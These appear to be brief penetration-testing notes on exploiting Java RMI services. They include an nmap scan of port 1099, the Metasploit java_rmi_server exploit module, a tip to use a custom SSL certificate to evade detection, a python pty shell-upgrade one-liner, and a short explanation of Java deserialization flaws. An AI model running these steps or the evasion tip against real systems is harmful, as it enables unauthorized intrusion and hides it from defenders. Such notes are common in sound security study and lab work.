nmap -sT 192.168.13.29 -p 1099 -sV

GNU Classpath Registry Fingerprint

use exploit/multi/misc/java_rmi_server

you should use a custom ssl cert to evade detection

python -c ‘import pty; pty.spawn("/bin/sh")’

bash

usually on port 1099 but there are non standard ways

----------------------

Java-based applications Jboss,
WebLogic, WebSphere and Jenkins to name a few, are affected by
this class of vulnerability.

To explain it simply, serialization itself is a process which allows for
applications to convert data into a binary format, which is suitable
for saving to disk.
In the case of this example, suitable for that data to be transferred
over a network and into an application to be then “deserialized” and
processed by the application as usable data again.
